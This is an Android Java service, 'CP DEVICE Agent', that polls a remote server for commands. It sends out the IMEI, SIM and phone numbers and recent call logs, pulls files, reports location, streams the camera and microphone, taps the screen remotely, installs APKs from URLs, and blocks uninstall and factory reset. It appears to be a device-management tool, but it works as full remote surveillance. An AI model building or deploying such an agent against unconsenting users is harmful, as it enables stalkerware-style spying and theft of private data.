package com.cpdevice.agent;
import android.database.Cursor;
import android.provider.CallLog;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.UserManager;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service {
    private volatile boolean running;
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("cp-device", Context.MODE_PRIVATE);
        createChannel();
        startForeground(10, notification());
        running = true;
        new Thread(this::loop).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    private void loop() {
        while (running) {
            try {
                heartbeat();
                String commandsJson = request("GET", "/api/device/" + deviceId() + "/commands", null);
                processCommands(commandsJson);
                Thread.sleep(2000);
            } catch (Exception error) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); }
            }
        }
    }

    private void heartbeat() throws Exception {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName receiver = new ComponentName(this, CpDeviceAdminReceiver.class);
        boolean admin = dpm != null && dpm.isAdminActive(receiver);
        boolean owner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());
        if (owner) enforceOwnerSecurity(dpm, receiver);
        boolean accessibility = CpAccessibilityService.isReady();
        boolean camera = hasPermission(Manifest.permission.CAMERA) && hasPermission(Manifest.permission.RECORD_AUDIO);
        boolean location = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) || hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION);
        boolean files = hasFileAccess();
        String alerts = securityAlerts(owner, admin, camera, location, files, accessibility);
        String deviceDetails = collectDeviceDetails();
        String body = "{\"info\":{\"manufacturer\":\"" + safe(Build.MANUFACTURER) + "\",\"model\":\"" + safe(Build.MODEL) + "\",\"androidVersion\":\"" + safe(Build.VERSION.RELEASE) + "\",\"androidId\":\"" + safe(prefs.getString("androidId", "")) + "\"},\"deviceDetails\":" + deviceDetails + ",\"capabilities\":{\"nativeAgent\":true,\"deviceAdmin\":" + admin + ",\"deviceOwner\":" + owner + ",\"accessibility\":" + accessibility + ",\"camera\":" + camera + ",\"files\":" + files + ",\"location\":" + location + ",\"oemPrivileged\":false},\"operation\":{\"agent\":\"running\",\"deviceAdmin\":" + admin + ",\"deviceOwner\":" + owner + ",\"accessibility\":" + accessibility + ",\"tamperResistant\":" + owner + ",\"factoryResetBlockedInSettings\":" + owner + ",\"recoveryFactoryResetBlockable\":false},\"alerts\":" + alerts + "}";
        request("POST", "/api/device/" + deviceId() + "/heartbeat", body);
    }

    private void processCommands(String commandsJson) throws Exception {
        int index = 0;
        while ((index = commandsJson.indexOf("\"id\":\"", index)) >= 0) {
            int start = index + 6;
            int end = commandsJson.indexOf("\"", start);
            String commandId = commandsJson.substring(start, end);
            int typeStart = commandsJson.indexOf("\"type\":\"", end) + 8;
            int typeEnd = commandsJson.indexOf("\"", typeStart);
            String type = commandsJson.substring(typeStart, typeEnd);
            String output = execute(type, commandsJson, index);
            String result = "{\"commandId\":\"" + safe(commandId) + "\",\"result\":{\"ok\":true,\"output\":\"" + safe(output) + "\"}}";
            request("POST", "/api/device/" + deviceId() + "/commands", result);
            index = typeEnd;
        }
    }

    private String execute(String type, String commandJson, int commandStart) {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName receiver = new ComponentName(this, CpDeviceAdminReceiver.class);
        boolean admin = dpm != null && dpm.isAdminActive(receiver);
        boolean owner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());
        if ("agent.unenroll".equals(type)) return releaseManagement(dpm, receiver, owner, admin);
        if ("device.info.refresh".equals(type)) return collectDeviceDetails();
        if ("shell".equals(type)) return owner ? "Device Owner active. Root shell still requires OEM/system/root integration." : (admin ? "Device Admin active. Android does not expose arbitrary root shell to normal APKs." : "Device Admin is not active.");
        if ("app.install".equals(type)) return installApk(textValue(commandJson, "apkUrl", commandStart, ""));
        if ("file.list".equals(type)) return listFiles(textValue(commandJson, "path", commandStart, "/sdcard"));
        if ("file.pull".equals(type)) return exportFile(textValue(commandJson, "path", commandStart, ""), textValue(commandJson, "id", commandStart, "manual"));
        if ("locate.device".equals(type)) return locateDevice();
        if ("lock.device".equals(type)) { if (admin) { dpm.lockNow(); return "Device locked."; } return "Device Admin is required to lock device."; }
        if ("mobile.data.on".equals(type)) return owner ? "Device Owner active, but Android public APIs still do not expose mobile data toggle. Requires OEM/system API." : "Android does not allow normal or Device Admin apps to toggle mobile data. Requires OEM/system privileges.";
        if ("firmware.update".equals(type)) return "Firmware update queued URL received. Android firmware flashing requires Device Owner system update policy, OEM/system privileges, or vendor updater integration.";
        if ("screen.control.request".equals(type)) { openScreenCaptureConsent(); return "Screen capture permission opened on device. Approve it to start live remote desktop."; }
        if ("screen.tap".equals(type)) {
            int x = numberAfter(commandJson, "\\\"x\\\":", commandStart, 360);
            int y = numberAfter(commandJson, "\\\"y\\\":", commandStart, 640);
            return CpAccessibilityService.tap(x, y) ? "Tap dispatched at " + x + "," + y : "Accessibility service is not enabled.";
        }
        if ("camera.stream.request".equals(type)) { Intent intent = new Intent(this, CameraStreamService.class); intent.putExtra("facing", textValue(commandJson, "facing", commandStart, "back")); startForegroundService(intent); return "Camera stream requested. Android camera and microphone permissions must be approved on the device."; }
        if ("camera.switch".equals(type)) { Intent stop = new Intent(this, CameraStreamService.class); stopService(stop); Intent intent = new Intent(this, CameraStreamService.class); intent.putExtra("facing", textValue(commandJson, "facing", commandStart, "front")); startForegroundService(intent); return "Camera switched to " + textValue(commandJson, "facing", commandStart, "front") + "."; }
        return "Command received: " + type;
    }

    private void enforceOwnerSecurity(DevicePolicyManager dpm, ComponentName receiver) {
        try { dpm.setUninstallBlocked(receiver, getPackageName(), true); } catch (Exception ignored) { }
        if (Build.VERSION.SDK_INT >= 23) {
            try { dpm.setPermissionPolicy(receiver, DevicePolicyManager.PERMISSION_POLICY_AUTO_GRANT); } catch (Exception ignored) { }
            grantPermission(dpm, receiver, Manifest.permission.CAMERA);
            grantPermission(dpm, receiver, Manifest.permission.RECORD_AUDIO);
            grantPermission(dpm, receiver, Manifest.permission.ACCESS_FINE_LOCATION);
            grantPermission(dpm, receiver, Manifest.permission.ACCESS_COARSE_LOCATION);
            grantPermission(dpm, receiver, Manifest.permission.READ_PHONE_STATE);
            if (Build.VERSION.SDK_INT >= 26) grantPermission(dpm, receiver, Manifest.permission.READ_PHONE_NUMBERS);
            grantPermission(dpm, receiver, Manifest.permission.READ_CALL_LOG);
            if (Build.VERSION.SDK_INT >= 33) grantPermission(dpm, receiver, Manifest.permission.POST_NOTIFICATIONS);
        }
        addRestriction(dpm, receiver, UserManager.DISALLOW_APPS_CONTROL);
        addRestriction(dpm, receiver, UserManager.DISALLOW_SAFE_BOOT);
        addRestriction(dpm, receiver, UserManager.DISALLOW_FACTORY_RESET);
    }

    private void grantPermission(DevicePolicyManager dpm, ComponentName receiver, String permission) {
        if (Build.VERSION.SDK_INT < 23) return;
        try { dpm.setPermissionGrantState(receiver, getPackageName(), permission, DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED); } catch (Exception ignored) { }
    }

    private boolean hasPermission(String permission) {
        return Build.VERSION.SDK_INT < 23 || checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasFileAccess() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private void addRestriction(DevicePolicyManager dpm, ComponentName receiver, String restriction) {
        try { dpm.addUserRestriction(receiver, restriction); } catch (Exception ignored) { }
    }

    private void clearRestriction(DevicePolicyManager dpm, ComponentName receiver, String restriction) {
        try { dpm.clearUserRestriction(receiver, restriction); } catch (Exception ignored) { }
    }

    private String securityAlerts(boolean owner, boolean admin, boolean camera, boolean location, boolean files, boolean accessibility) {
        StringBuilder alerts = new StringBuilder("[");
        int count = 0;
        count = addAlert(alerts, count, owner ? "" : "device_owner_required_for_tamper_resistant_enrollment");
        count = addAlert(alerts, count, admin ? "" : "device_admin_inactive");
        count = addAlert(alerts, count, camera ? "" : "camera_or_microphone_permission_missing");
        count = addAlert(alerts, count, location ? "" : "location_permission_missing");
        count = addAlert(alerts, count, files ? "" : "file_access_permission_missing");
        addAlert(alerts, count, accessibility ? "" : "accessibility_service_inactive");
        alerts.append("]");
        return alerts.toString();
    }

    private int addAlert(StringBuilder alerts, int count, String alert) {
        if (alert.length() == 0) return count;
        if (count > 0) alerts.append(",");
        alerts.append("\"").append(alert).append("\"");
        return count + 1;
    }

    private String releaseManagement(DevicePolicyManager dpm, ComponentName receiver, boolean owner, boolean admin) {
        try {
            if (owner && dpm != null) {
                try { dpm.setUninstallBlocked(receiver, getPackageName(), false); } catch (Exception ignored) { }
                clearRestriction(dpm, receiver, UserManager.DISALLOW_APPS_CONTROL);
                clearRestriction(dpm, receiver, UserManager.DISALLOW_SAFE_BOOT);
                clearRestriction(dpm, receiver, UserManager.DISALLOW_FACTORY_RESET);
            }
            if (admin && dpm != null) {
                try { dpm.removeActiveAdmin(receiver); } catch (Exception ignored) { }
            }
            stopSelf();
            return "CP DEVICE management released. Device Admin/Owner restrictions were cleared where Android permits; the app can now be uninstalled by the device user.";
        } catch (Exception error) {
            return "Unenroll failed: " + safe(error.getMessage());
        }
    }

    private String collectDeviceDetails() {
        StringBuilder json = new StringBuilder("{");
        appendJsonField(json, "collectedAt", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(new java.util.Date()));
        appendJsonField(json, "imei", readImei());
        appendJsonField(json, "macAddresses", readMacAddresses());
        appendJsonField(json, "simCards", readSimCards());
        appendJsonField(json, "phoneNumbers", readPhoneNumbers());
        appendJsonField(json, "lastCallLogs", readLastCallLogs());
        json.append("}");
        return json.toString();
    }

    private String readImei() {
        try {
            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) return "permission_required";
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return "unavailable";
            if (Build.VERSION.SDK_INT >= 26) return safe(tm.getImei());
            return safe(tm.getDeviceId());
        } catch (SecurityException error) { return "restricted_by_android"; } catch (Exception error) { return "unavailable"; }
    }

    private String readMacAddresses() {
        StringBuilder out = new StringBuilder("[");
        int count = 0;
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface networkInterface : interfaces) {
                byte[] mac = networkInterface.getHardwareAddress();
                if (mac == null || mac.length == 0) continue;
                if (count++ > 0) out.append(",");
                out.append("{\"name\":\"").append(safe(networkInterface.getName())).append("\",\"mac\":\"").append(formatMac(mac)).append("\"}");
            }
        } catch (Exception ignored) { }
        out.append("]");
        return out.toString();
    }

    private String readSimCards() {
        StringBuilder out = new StringBuilder("[");
        int count = 0;
        try {
            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) return "[]";
            SubscriptionManager manager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (manager == null) return "[]";
            List<SubscriptionInfo> sims = manager.getActiveSubscriptionInfoList();
            if (sims == null) return "[]";
            for (SubscriptionInfo sim : sims) {
                if (count++ > 0) out.append(",");
                out.append("{\"slot\":").append(sim.getSimSlotIndex()).append(",\"carrier\":\"").append(safe(String.valueOf(sim.getCarrierName()))).append("\",\"country\":\"").append(safe(sim.getCountryIso())).append("\",\"number\":\"").append(safe(sim.getNumber())).append("\"}");
            }
        } catch (SecurityException ignored) { } catch (Exception ignored) { }
        out.append("]");
        return out.toString();
    }

    private String readPhoneNumbers() {
        StringBuilder out = new StringBuilder("[");
        int count = 0;
        try {
            if (Build.VERSION.SDK_INT >= 26 && !hasPermission(Manifest.permission.READ_PHONE_NUMBERS)) return "[]";
            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) return "[]";
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String line = tm == null ? "" : tm.getLine1Number();
            if (line != null && line.length() > 0) { out.append("\"").append(safe(line)).append("\""); count++; }
            String sims = readSimCards();
            if (sims.contains("\"number\":\"")) { /* SIM numbers are included in simCards. */ }
        } catch (SecurityException ignored) { } catch (Exception ignored) { }
        out.append("]");
        return out.toString();
    }

    private String readLastCallLogs() {
        StringBuilder out = new StringBuilder("[");
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return "[]";
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            int count = 0;
            while (cursor != null && cursor.moveToNext() && count < 5) {
                if (count++ > 0) out.append(",");
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                out.append("{\"number\":\"").append(safe(number)).append("\",\"type\":\"").append(safe(callType(type))).append("\",\"date\":\"").append(new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(new java.util.Date(date))).append("\",\"durationSeconds\":").append(duration).append("}");
            }
        } catch (SecurityException ignored) { } catch (Exception ignored) { } finally { if (cursor != null) cursor.close(); }
        out.append("]");
        return out.toString();
    }

    private String callType(String type) {
        try {
            int value = Integer.parseInt(type);
            if (value == CallLog.Calls.INCOMING_TYPE) return "incoming";
            if (value == CallLog.Calls.OUTGOING_TYPE) return "outgoing";
            if (value == CallLog.Calls.MISSED_TYPE) return "missed";
            if (Build.VERSION.SDK_INT >= 24 && value == CallLog.Calls.BLOCKED_TYPE) return "blocked";
            if (Build.VERSION.SDK_INT >= 24 && value == CallLog.Calls.REJECTED_TYPE) return "rejected";
        } catch (Exception ignored) { }
        return "other";
    }

    private String formatMac(byte[] mac) {
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            if (i > 0) builder.append(":");
            builder.append(String.format("%02X", mac[i]));
        }
        return builder.toString();
    }

    private void appendJsonField(StringBuilder json, String key, String value) {
        if (json.length() > 1) json.append(",");
        json.append("\"").append(key).append("\":");
        if (value != null && (value.startsWith("[") || value.startsWith("{"))) json.append(value);
        else json.append("\"").append(safe(value)).append("\"");
    }

    private String locateDevice() {
        try {
            LocationManager manager = (LocationManager) getSystemService(LOCATION_SERVICE);
            boolean gpsEnabled = false;
            boolean networkEnabled = false;
            try { gpsEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER); } catch (Exception ignored) { }
            try { networkEnabled = manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) { }
            if (!gpsEnabled && !networkEnabled) { openLocationSettings(); return "Android Location is OFF. Location settings opened on the device; approve/turn it on once, then click Locate again."; }
            final Location[] fresh = new Location[1];
            final CountDownLatch latch = new CountDownLatch(1);
            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location location) { fresh[0] = location; latch.countDown(); }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) { }
                @Override public void onProviderEnabled(String provider) { }
                @Override public void onProviderDisabled(String provider) { }
            };
            try { manager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper()); } catch (Exception ignored) { }
            try { manager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper()); } catch (Exception ignored) { }
            try { latch.await(8, TimeUnit.SECONDS); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); }
            Location location = fresh[0];
            if (location == null) location = manager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location == null) return "Location unavailable. Turn on Android Location services and set CP DEVICE Location permission to Allow all the time or Allow while using, then try Locate again.";
            return "{\"lat\":" + location.getLatitude() + ",\"lng\":" + location.getLongitude() + ",\"accuracy\":" + location.getAccuracy() + ",\"mapUrl\":\"https://www.google.com/maps?q=" + location.getLatitude() + "," + location.getLongitude() + "\"}";
        } catch (SecurityException error) { return "Location permission is required. Enable Location permission for CP DEVICE."; } catch (Exception error) { return "Locate failed: " + safe(error.getMessage()); }
    }

    private void openLocationSettings() {
        Intent intent = new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void openScreenCaptureConsent() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setAction(MainActivity.ACTION_START_SCREEN);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private String installApk(String apkUrl) {
        try {
            if (apkUrl.length() == 0) return "Missing apkUrl";
            File apk = new File(getCacheDir(), "cp-install.apk");
            downloadToFile(apkUrl, apk);
            Uri uri = FileProvider.getUriForFile(this, "com.cpdevice.agent.fileprovider", apk);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivity(intent);
            return "APK downloaded. Android Package Installer opened for user approval.";
        } catch (Exception error) { return "Install failed: " + safe(error.getMessage()); }
    }

    private String listFiles(String requestedPath) {
        try {
            File dir = resolveFile(requestedPath);
            if (!dir.exists() || !dir.isDirectory()) return "{\\\"files\\\":[]}";
            File[] files = dir.listFiles();
            StringBuilder json = new StringBuilder("{\\\"files\\\":[");
            if (files != null) {
                int count = 0;
                for (File file : files) {
                    if (count++ > 0) json.append(",");
                    json.append("{\\\"name\\\":\\\"").append(safe(file.getName())).append("\\\",\\\"path\\\":\\\"").append(safe(file.getAbsolutePath())).append("\\\",\\\"directory\\\":").append(file.isDirectory()).append(",\\\"size\\\":").append(file.isDirectory() ? 0 : file.length()).append("}");
                    if (count >= 200) break;
                }
            }
            json.append("]}");
            return json.toString();
        } catch (Exception error) { return "File list failed: " + safe(error.getMessage()); }
    }

    private String exportFile(String requestedPath, String commandId) {
        try {
            File file = resolveFile(requestedPath);
            if (!file.exists() || !file.isFile()) return "File not found or not readable";
            uploadFile(file, commandId);
            return "Exported " + file.getName() + " (" + file.length() + " bytes)";
        } catch (Exception error) { return "Export failed: " + safe(error.getMessage()); }
    }

    private File resolveFile(String requestedPath) {
        if (requestedPath == null || requestedPath.length() == 0 || "/sdcard".equals(requestedPath)) return Environment.getExternalStorageDirectory();
        return new File(requestedPath);
    }

    private void downloadToFile(String fileUrl, File destination) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(fileUrl).openConnection();
        conn.setRequestProperty("Authorization", "Bearer " + token());
        try (FileOutputStream out = new FileOutputStream(destination); java.io.InputStream in = conn.getInputStream()) {
            byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) > 0) out.write(buffer, 0, read);
        }
    }

    private void uploadFile(File file, String commandId) throws Exception {
        URL url = new URL(serverUrl() + "/api/device/" + deviceId() + "/files");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", "Bearer " + token());
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestProperty("X-File-Name", file.getName());
        conn.setRequestProperty("X-Command-Id", commandId);
        conn.setDoOutput(true);
        try (OutputStream out = conn.getOutputStream(); FileInputStream in = new FileInputStream(file)) {
            byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) > 0) out.write(buffer, 0, read);
        }
        conn.getResponseCode();
    }

    private String textValue(String text, String key, int from, String fallback) {
        String marker = "\\\"" + key + "\\\":\\\"";
        int index = text.indexOf(marker, from);
        if (index < 0) return fallback;
        int start = index + marker.length();
        int end = text.indexOf("\\\"", start);
        if (end < 0) return fallback;
        return text.substring(start, end).replace("\\\\/", "/").replace("\\\\\"", "\"");
    }

    private int numberAfter(String text, String marker, int from, int fallback) {
        int index = text.indexOf(marker, from);
        if (index < 0) return fallback;
        int start = index + marker.length();
        int end = start;
        while (end < text.length() && Character.isDigit(text.charAt(end))) end++;
        try { return Integer.parseInt(text.substring(start, end)); } catch (Exception ignored) { return fallback; }
    }

    private String request(String method, String path, String body) throws Exception {
        URL url = new URL(serverUrl() + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod(method);
        conn.setRequestProperty("Authorization", "Bearer " + token());
        conn.setRequestProperty("Content-Type", "application/json");
        if (body != null) {
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) { os.write(body.getBytes(StandardCharsets.UTF_8)); }
        }
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getResponseCode() >= 400 ? conn.getErrorStream() : conn.getInputStream()));
        StringBuilder out = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) out.append(line);
        return out.toString();
    }

    private String serverUrl() { return prefs.getString("serverUrl", "https://admin-device-management.vercel.app").replaceAll("/$", ""); }
    private String deviceId() { return prefs.getString("deviceId", ""); }
    private String token() { return prefs.getString("deviceToken", ""); }
    private String safe(String value) { return value == null ? "" : value.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " "); }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("cp-device", "CP DEVICE Agent", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification notification() {
        Notification.Builder builder = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(this, "cp-device") : new Notification.Builder(this);
        return builder.setContentTitle("CP DEVICE Agent").setContentText("Connected to control server").setSmallIcon(android.R.drawable.stat_sys_upload_done).build();
    }
}






